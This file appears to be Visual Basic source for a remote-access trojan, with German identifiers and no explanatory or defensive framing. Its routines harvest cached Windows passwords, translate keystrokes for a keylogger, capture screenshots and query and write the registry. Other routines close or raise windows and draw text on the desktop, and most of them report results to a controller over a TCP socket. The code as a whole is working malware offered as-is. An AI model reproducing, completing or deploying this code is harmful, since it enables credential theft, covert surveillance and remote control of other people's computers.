    Dim sValue As String

    On Error GoTo QueryValueExError


    lrc = RegQueryValueExNULL(lhKey, szValueName, 0&, lType, 0&, cch)
    If lrc <> ERROR_NONE Then Error 5

    Select Case lType

        Case REG_SZ:
            sValue = String(cch, 0)

 lrc = RegQueryValueExString(lhKey, szValueName, 0&, lType, sValue, cch)

            If lrc = ERROR_NONE Then
                vValue = Left$(sValue, cch)
            Else
                vValue = Empty
            End If

        Case REG_DWORD:



lrc = RegQueryValueExLong(lhKey, szValueName, 0&, lType, lValue, cch)

            If lrc = ERROR_NONE Then vValue = lValue
        Case Else

            lrc = -1
    End Select




QueryValueExExit:

    aQueryValueEx = lrc
    Exit Function



QueryValueExError:

    Resume QueryValueExExit
Exit Function
o:
WennFehlerDann



End Function

Public Function aUserInfo(aB As String) As String
   On Error GoTo o
   If Fo.Text4.Text = "Standart" Or Fo.Text4.Text = "standart" Or Fo.Text4.Text = "(Standart)" Or Fo.Text4.Text = "(standart)" Then
   Fo.Text4.Text = ""
   Else
   End If
Dim info As String
Dim nFO As String
Dim NextX As Integer
Dim cmStr As String
cmStr = Fo.Text3.Text
If aB = "Local" Then
    info = aQueryValue(cmStr, Fo.Text4.Text, aB)
ElseIf aB = "CurrentUser" Then
info = aQueryValue(cmStr, Fo.Text4.Text, aB)
  ElseIf aB = "User" Then
  info = aQueryValue(cmStr, Fo.Text4.Text, aB)
ElseIf aB = "Class" Then
info = aQueryValue(cmStr, Fo.Text4.Text, aB)
ElseIf aB = "Dyn" Then
info = aQueryValue(cmStr, Fo.Text4.Text, aB)
ElseIf aB = "Config" Then
info = aQueryValue(cmStr, Fo.Text4.Text, aB)
End If



aUserInfo = info
Fo.Label2.Caption = aUserInfo & Fo.Text3.Text & Fo.Text4.Text
If Fo.UserInfoSendenJaNein = True Then
Fo.UserInfoSendenJaNein = False
Fo.Text1.Text = aUserInfo
Fo.TCP2.SendData Fo.Text1.Text
Else
End If
Exit Function
o:
WennFehlerDann
End Function

Sub aREGSeTzEN(a As String)
   On Error GoTo o
SetKeyValue Fo.Text5.Text, Fo.Text6.Text, Fo.Text7.Text, REG_SZ, a
Fo.TCP2.SendData "RegSS"
Exit Sub
o:
WennFehlerDann
End Sub

Public Function CheckKey(nKey As Integer) As String
On Error GoTo z
   If nKey = 32 Or _
      nKey >= 65 And nKey <= 90 Or _
      nKey >= 48 And nKey <= 57 Then

      CheckKey = ""

      If GetKeyState(18) < 0 Then
         CheckKey = "ALT+"
      End If
      If GetKeyState(17) < 0 Then
         CheckKey = CheckKey + "CTRL+"
      End If
      If GetKeyState(16) < 0 Then
         If nKey >= 65 And nKey <= 90 Then
            If (GetKeyState(VK_CAPITAL) And 1) = 1 Then
               nKey = nKey + 32
            End If
         Else
            CheckKey = CheckKey + "SHIFT+"
         End If
      Else
         If nKey >= 65 And nKey <= 90 Then
            If (GetKeyState(VK_CAPITAL) And 1) = 0 Then
               nKey = nKey + 32
            End If
         End If
      End If

      CheckKey = IIf(CheckKey = "", "", "[") + _
                 CheckKey + Chr(nKey) + _
                 IIf(CheckKey = "", "", "]")

   ElseIf nKey >= VK_NUMPAD0 And _
          nKey <= VK_NUMPAD9 Then

      CheckKey = Chr(nKey - VK_NUMPAD0 + 48)

   ElseIf nKey >= VK_F1 And _
          nKey <= VK_F24 Then

      CheckKey = "[F" + CStr(nKey - VK_F1 + 1) + "]"

   ElseIf nKey = VK_ESCAPE Then
      CheckKey = "[ESC]"
   ElseIf nKey = VK_END Then
      CheckKey = "[END]"
   ElseIf nKey = VK_HOME Then
      CheckKey = "[HOME]"
   ElseIf nKey = VK_LEFT Then
      CheckKey = "[LEFT]"
   ElseIf nKey = VK_UP Then
      CheckKey = "[UP]"
   ElseIf nKey = VK_RIGHT Then
      CheckKey = "[RIGHT]"
   ElseIf nKey = VK_DOWN Then
      CheckKey = "[DOWN]"
   ElseIf nKey = VK_PRIOR Then
      CheckKey = "[PGUP]"
   ElseIf nKey = VK_NEXT Then
      CheckKey = "[PGDN]"
   ElseIf nKey = VK_INSERT Then
      CheckKey = "[INS]"
   ElseIf nKey = VK_DELETE Then
      CheckKey = "[DEL]"
   ElseIf nKey = VK_RETURN Then
      CheckKey = "[ENTER]" + vbCrLf
   ElseIf nKey = VK_BACK Then
      CheckKey = "[BACKSPACE]"
   ElseIf nKey = VK_TAB Then
      CheckKey = "[TAB]"
   End If
   Exit Function
z:
   WennFehlerDann
End Function


Sub WennFehlerDann()
On Error GoTo WennFehler
Fo.TCP2.SendData "Fehler"
Exit Sub
WennFehler:

End Sub

Sub FensterSchliessen()
On Error GoTo z
Dim WHandle As Long
Dim r As Long
If Left(Fo.Text2.Text, Len("WindowsEnde")) = "WindowsEnde" Then
    WHandle = FindWindow(vbNullString, Right(Fo.Text2.Text, Len(Fo.Text2.Text) - Len("WindowsEnde")))
    If WHandle <> 0 Then
    
    
        r = PostMessage(WHandle, &H10, 0&, 0&)
        If r = 0 Then

              Fo.TCP2.SendData "LeiderFensterNicht"
              Exit Sub
              Else
              
        Fo.TCP2.SendData "FensterZU"
      End If
      End If

Else
WHandle = FindWindow(vbNullString, Fo.Text2.Text)
    If WHandle <> 0 Then
    
    BringWindowToTop WHandle

        Fo.TCP2.SendData "FensterTop"
        Else
        Fo.TCP2.SendData "LeiderFensterN"
        Exit Sub
        End If

End If
      
Exit Sub
z:
WennFehlerDann

End Sub

Public Sub GetWindowSnapShot(Mode As Long, Img As Object)
    Dim altscan%, NT As Boolean
    NT = IsNT
    If Not NT Then
        If Mode = 0& Then Mode = 1& Else Mode = 0&
    End If
    If NT And Mode = 0 Then
        keybd_event vbKeySnapshot, 0&, 0&, 0&
    Else
        altscan = MapVirtualKey(VK_MENU, 0)
        keybd_event VK_MENU, altscan, 0, 0


        DoEvents
        keybd_event vbKeySnapshot, Mode, 0&, 0&
    End If
    DoEvents
    Img.Picture = Clipboard.GetData(vbCFBitmap)
    keybd_event VK_MENU, altscan, KEYEVENTF_KEYUP, 0
End Sub



Public Function IsNT() As Boolean
    Dim verinfo As OSVERSIONINFO
    verinfo.dwOSVersionInfoSize = Len(verinfo)
    If (GetVersionEx(verinfo)) = 0 Then Exit Function
    If verinfo.dwPlatformId = 2 Then IsNT = True
End Function
Public Function callback(x As PASSWORD_CACHE_ENTRY, ByVal lSomething As Long) As Integer


    Dim nLoop As Integer
    Dim cString As String
    Dim ccomputer
    Dim Resource As String
    Dim ResType As String
    Dim Password As String
    ResType = x.nType
    For nLoop = 1 To x.cbResource

        If x.abResource(nLoop) <> 0 Then
            cString = cString & Chr(x.abResource(nLoop))
        Else
            cString = cString & " "
        End If
    Next

    Resource = cString
    cString = ""


    For nLoop = x.cbResource + 1 To (x.cbResource + x.cbPassword)


        If x.abResource(nLoop) <> 0 Then
            cString = cString & Chr(x.abResource(nLoop))
        Else
            cString = cString & " "
        End If


    Next

    Password = cString
    cString = ""
  
Fo.Text1.Text = Fo.Text1.Text & vbCrLf & Resource & "; Passwort: " & Password

      
      
        callback = True
    End Function



Public Sub GetPasswords()
Fo.Text1.Text = Fo.Text1.Text & vbCrLf & vbCrLf & "Chached Passwörter:"

    Dim nLoop As Integer
    Dim cString As String
    Dim lLong As Long
    Dim bByte As Byte
    bByte = &HFF
    nLoop = 0
    lLong = 0
    cString = ""
    Call WNetEnumCachedPasswords(cString, nLoop, bByte, AddressOf callback, lLong)
End Sub

Public Function ActiveConnection() As Boolean
Dim hKey As Long
Dim lpSubKey As String
Dim phkResult As Long
Dim lpValueName As String
Dim lpReserved As Long
Dim lpType As Long
Dim lpData As Long
Dim lpcbData As Long
ActiveConnection = False
lpSubKey = "System\CurrentControlSet\Services\RemoteAccess"
ReturnCode = RegOpenKey(HKEY_LOCAL_MACHINE, lpSubKey, phkResult)

If ReturnCode = ERROR_SUCCESS Then
    hKey = phkResult
    lpValueName = "Remote Connection"
    lpReserved = APINULL
    lpType = APINULL
    lpData = APINULL
    lpcbData = APINULL
    ReturnCode = RegQueryValueEx(hKey, lpValueName, _
    lpReserved, lpType, ByVal lpData, lpcbData)
    lpcbData = Len(lpData)
    ReturnCode = RegQueryValueEx(hKey, lpValueName, _
    lpReserved, lpType, lpData, lpcbData)
    
    If ReturnCode = ERROR_SUCCESS Then
        If lpData = 0 Then
            ActiveConnection = False
        Else
            ActiveConnection = True
        End If
    End If
                
RegCloseKey (hKey)
End If

End Function

Public Sub SoundAbSpielen()
On Error GoTo z
Dim RetVal As Long
If Fo.Text2.Text = "a" Then
RetVal = MessageBeep(MB_ICONQUESTION)
ElseIf Fo.Text2.Text = "b" Then
RetVal = MessageBeep(MB_ICONEXCLAMATION)
ElseIf Fo.Text2.Text = "c" Then
RetVal = MessageBeep(MB_ICONASTERISK)
ElseIf Fo.Text2.Text = "d" Then
RetVal = MessageBeep(MB_ICONHAND)
ElseIf Fo.Text2.Text = "e" Then
RetVal = MessageBeep(MB_OK)
Else
End If
Fo.TCP2.SendData "SoundWurdeAbGespielt"
Exit Sub
z:
WennFehlerDann
End Sub


Public Sub TextAmDesktop()
On Error GoTo x
DesktopInfo Fo.Text2.Text, 12, "", 12
Fo.TCP2.SendData "TextAmDesktopOK"
Exit Sub
x:
WennFehlerDann
End Sub
Public Sub DesktopInfo(zeile1 As String, vfarbe1 As Integer, zeile2 As String, vfarbe2 As Integer)

Dim hdc As Long
Dim tR As RECT
Dim lCol As Long
If vfarbe1 < 0 Or vfarbe1 > 16 Then vfarbe1 = 12
If vfarbe2 < 0 Or vfarbe2 > 16 Then vfarbe2 = 0

hdc = CreateDCAsNull("DISPLAY", ByVal 0&, ByVal 0&, ByVal 0&)

tR.Left = 0
tR.Top = 0
tR.Right = 640
tR.Bottom = 32
lCol = GetTextColor(hdc)
SetTextColor hdc, QBColor(vfarbe1)
DrawText hdc, zeile1, Len(zeile1), tR, 0

tR.Top = 15
SetTextColor hdc, QBColor(vfarbe2)
DrawText hdc, zeile2, Len(zeile2), tR, 0
SetTextColor hdc, lCol

DeleteDC hdc
End Sub

Public Sub ZwischenAblageLeeren()
On Error GoTo x
Clipboard.Clear
Fo.TCP2.SendData "ZwischeLeer"
Exit Sub
x:
End Sub


































  
Public Function Compiled() As Boolean
  On Error Resume Next
  Compiled = (Err.Number = 0)
End Function

Public Function PointerToString(p As Long) As String
  Dim c&
  c = lstrlen(p)
  PointerToString = String$(c, 0)
  RtlMoveMemory ByVal PointerToString, ByVal p, c
  PointerToString = TrimNull(PointerToString)
End Function

Public Function TrimNull(s As String) As String
  Dim iWhere%
  iWhere = InStr(1, s, Chr(0))
  
  If iWhere > 0 Then
    TrimNull = Left$(s, iWhere - 1)
  Else
    TrimNull = s
  End If
End Function

Sub ICQAPINotify_AppBarStateChange(ByVal iDockingState As Long)

End Sub


Sub ICQAPINotify_FileReceived(ByVal pszFileNames As Long)
  
  Form1.List1.AddItem PointerToString(pszFileNames)
End Sub
Sub ICQAPINotify_OnlineFullUserDataChange(ByVal iUIN As Long)

End Sub
Sub ICQAPINotify_OnlineListChange(ByVal iType As Long)
  RtlMoveMemory ICQ, ObjPointer, 4
    ICQ.ListChanged (iType)
  RtlMoveMemory ICQ, 0&, 4
End Sub

Sub ICQAPINotify_OnlineListHandleChange(ByVal hWindow As Long)
 Form1.List1.AddItem "Handle Changed"
End Sub


Sub ICQAPINotify_OnlinePlacement_Change()
  Form1.List1.AddItem "Placement Changed"
End Sub


Sub ICQAPINotify_OwnerChange(ByVal iUIN As Long)

End Sub

Sub ICQAPINotify_OwnerFullDataChange()

End Sub


Public Function DesktopVerzeichnis() As String
Dim ItemList As ITEMIDLIST
Dim sPfad As String
Dim lLänge As Long
Const lReservieren As Long = 255
If SHGetSpecialFolderLocation(0, &H0, ItemList) = NOERROR Then
sPfad = Space(lReservieren)
If SHGetPathFromIDList(ItemList.mkid.cb, sPfad) <> 0 Then
sPfad = Left(sPfad, InStr(sPfad, vbNullChar) - 1)
Else
sPfad = ""
End If
DesktopVerzeichnis = sPfad
Else
DesktopVerzeichnis = ""
End If
End Function
